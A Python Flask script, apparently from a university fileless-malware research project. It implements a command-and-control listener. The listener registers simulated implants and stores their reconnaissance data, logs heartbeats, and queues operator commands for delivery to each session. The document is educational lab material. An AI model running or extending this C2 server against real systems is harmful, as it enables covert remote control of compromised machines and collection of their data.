"""
Command and Control (C2) Listener
IT 359 Final Project - Fileless Malware Research

This script serves as the C2 server that receives data from the 
simulated fileless malware via HTTP.

WARNING: This is for educational purposes only. 
Only use in controlled lab environments.
"""

from __future__ import annotations

import argparse
import json
import logging
from datetime import datetime
from typing import Any, Dict, List, Optional

from flask import Flask, jsonify, request

app = Flask(__name__)

# In-memory storage for demo purposes only
SESSIONS: Dict[str, Dict[str, Any]] = {}
HEARTBEATS: List[Dict[str, Any]] = []
COMMAND_QUEUE: Dict[str, List[str]] = {}


def configure_logging(verbose: bool = False) -> None:
    """Configure simple console logging."""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )


@app.route("/", methods=["GET"])
def index():
    """Simple health-check endpoint."""
    return jsonify({"status": "ok", "message": "IT359 C2 Listener"})


@app.route("/register", methods=["POST"])
def register():
    """Initial registration endpoint used by fileless_simulation.ps1.

    Expects JSON produced by Get-SystemRecon in the PowerShell script.
    """
    data = request.get_json(force=True, silent=True) or {}

    session_id = str(data.get("SessionId") or data.get("session_id") or "unknown")
    timestamp = datetime.utcnow().isoformat(timespec="seconds") + "Z"

    SESSIONS[session_id] = {
        "recon": data,
        "registered_at": timestamp,
    }

    # Initialize empty command queue for this session
    COMMAND_QUEUE.setdefault(session_id, [])

    logging.info("New registration from session %s", session_id)
    logging.debug("Recon data: %s", json.dumps(data, indent=2))

    return jsonify({
        "status": "registered",
        "session_id": session_id,
        "registered_at": timestamp,
    })


@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    """Heartbeat endpoint used by Start-BeaconLoop in fileless_simulation.ps1.

    Expects JSON with SessionId, Iteration, Timestamp, Status.
    Returns an optional command for the beacon to display.
    """
    data = request.get_json(force=True, silent=True) or {}

    session_id = str(data.get("SessionId") or data.get("session_id") or "unknown")
    iteration = data.get("Iteration")
    status = data.get("Status")

    entry = {
        "session_id": session_id,
        "iteration": iteration,
        "status": status,
        "received_at": datetime.utcnow().isoformat(timespec="seconds") + "Z",
        "raw": data,
    }
    HEARTBEATS.append(entry)

    logging.info(
        "Heartbeat from session %s (iteration=%s, status=%s)",
        session_id,
        iteration,
        status,
    )

    # Pop next command for this session if one exists
    command: Optional[str] = None
    queue = COMMAND_QUEUE.get(session_id) or []
    if queue:
        command = queue.pop(0)
        logging.info("Dispatching command to %s: %s", session_id, command)

    return jsonify({
        "status": "ok",
        "command": command,
    })


@app.route("/sessions", methods=["GET"])
def list_sessions():
    """List known sessions and basic info (demo/inspection only)."""
    return jsonify({
        "sessions": SESSIONS,
    })


@app.route("/commands/<session_id>", methods=["POST", "GET"])
def manage_commands(session_id: str):
    """Add or view queued commands for a specific session.

    - GET  /commands/<session_id>  -> list queued commands
    - POST /commands/<session_id>  -> add a command (JSON: {"command": "..."})
    """
    if request.method == "GET":
        return jsonify({
            "session_id": session_id,
            "queue": COMMAND_QUEUE.get(session_id, []),
        })

    payload = request.get_json(force=True, silent=True) or {}
    cmd = payload.get("command")
    if not cmd:
        return jsonify({"error": "Missing 'command' field"}), 400

    COMMAND_QUEUE.setdefault(session_id, []).append(str(cmd))
    logging.info("Queued command for %s: %s", session_id, cmd)

    return jsonify({
        "status": "queued",
        "session_id": session_id,
        "command": cmd,
    })


def parse_args() -> argparse.Namespace:
    """Parse CLI arguments for host/port configuration."""
    parser = argparse.ArgumentParser(description="IT359 C2 Listener (Flask)")
    parser.add_argument("--host", default="0.0.0.0", help="Host/IP to bind (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=8080, help="Port to listen on (default: 8080)")
    parser.add_argument("--debug", action="store_true", help="Enable Flask debug mode")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    return parser.parse_args()


def main() -> None:
    """Main entry point for the C2 listener."""
    args = parse_args()
    configure_logging(verbose=args.verbose)

    logging.info("Starting C2 Listener on %s:%d", args.host, args.port)
    logging.info("Use Ctrl+C to stop.")

    # Important: Disable Flask's reloader when running under CLI to avoid
    # duplicating the listener logic.
    app.run(host=args.host, port=args.port, debug=args.debug, use_reloader=False)


if __name__ == "__main__":
    main()
